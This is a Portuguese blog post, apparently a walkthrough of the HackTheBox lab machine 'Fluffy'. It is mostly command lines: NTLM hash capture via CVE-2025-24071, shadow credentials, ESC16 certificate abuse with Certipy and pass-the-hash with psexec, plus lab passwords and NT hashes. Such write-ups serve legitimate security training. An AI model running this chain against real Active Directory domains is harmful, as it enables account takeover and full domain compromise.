---
layout:       post
title:        "Fluffy Machine - HTB (Windows | Easy)"
author:       "Felipe Silva Rosa"
header-style: text
catalog:      true
tags:
    - HackTheBox
    - Pentest
    - Windows
---

## 👤 Credenciais Iniciais

- **Usuário:** `j.fleischman`
- **Senha:** `J0elTHEM4n1990!`


## 🛠️ Ferramentas Utilizadas

- nmap
- smbclient
- bloodhound
- pywhisker
- evil-winrm
- impacket
- hashcat
- ntpdate

> ⚠️ Clock skew too great
> 
> Corrigir com:
> 
```bash
ntpdate 10.10.11.69
```


## 🔎 Enumeração Inicial

### Nmap

```bash
nmap -T4 -p- -v -A -oX -P0 fluffy_tcp.scan 10.10.11.69 --webxml
```

- Domínio: `FLUFFY.HTB`
- DC: `DC01.FLUFFY.HTB`


## 📁 Enumeração SMB

```bash
smbclient -L //10.10.11.69 -U j.fleischman --password=J0elTHEM4n1990!
```

Shares encontrados:

```
ADMIN$, C$, IPC$, IT, NETLOGON, SYSVOL
```

Acessando share IT:

```bash
smbclient //10.10.11.69/IT -U j.fleischman --password=J0elTHEM4n1990!
```

Arquivos:

- Everything-1.4.1.1026.x64/
- Everything-1.4.1.1026.x64.zip
- KeePass-2.58/
- KeePass-2.58.zip
- Upgrade_Notice.pdf ← **Arquivo chave**


## 📝 Upgrade_Notice.pdf

- Lista várias CVEs
- Destaque: **CVE-2025-24071**
- Usada para capturar hash NTLMv2 via listener SMB
- Capturado hash do usuário: **p.agila**


## 🔐 Cracking NTLMv2

**Usuário:** `p.agila`  
**Senha:** `prometheusx-303`


## 🧠 BloodHound (recon)

```bash
bloodhound-python -d FLUFFY.HTB -u j.fleischman -p "J0elTHEM4n1990!" -gc dc01.fluffy.htb -c all -ns 10.10.11.69
```

- `p.agila` ∈ `SERVICE ACCOUNT MANAGERS`
- Esse grupo → `GenericAll` → `SERVICE ACCOUNTS`
- `SERVICE ACCOUNTS` → `GenericWrite` → `ca_svc`, `ldap_svc`, `winrm_svc`


## ➕ Adicionar p.agila ao grupo

```bash
net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"
```


## 🧙 Shadow Credentials (pywhisker)

```bash
pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
gettgtpkinit -cert-pem oBwGyENT_cert.pem -key-pem oBwGyENT_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
export KRB5CCNAME=winrm_svc.ccache
getnthash -key <key> fluffy.htb/winrm_svc
```


## 📡 Acesso com Evil-WinRM

```bash
evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

**USER FLAG PWNED**


## 🔐 Escalada de Privilégio (ESC16 via Certipy)

> ⚠️ Usar versão atualizada da ferramenta direto do GitHub!

```bash
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
```

NT hash:

```
ca0f4f9e9eb8a092addf53bb03fc98c8
```


## 🔍 Verificar vulnerabilidade ESC16

```bash
certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout
```

Ler UPN da vítima:

```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
```


## 📝 Alterar UPN do ca_svc → Administrator

```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update
```


## 📄 Requisitar Certificado

```bash
certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
```


## 🔄 Reverter UPN

```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```


## ✅ Autenticar como Administrator

```bash
certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

Hash:

```
aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```


## 💣 Execução final: PTH com psexec

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e Administrator@10.10.11.69
```

**SYSTEM FLAG PWNED**
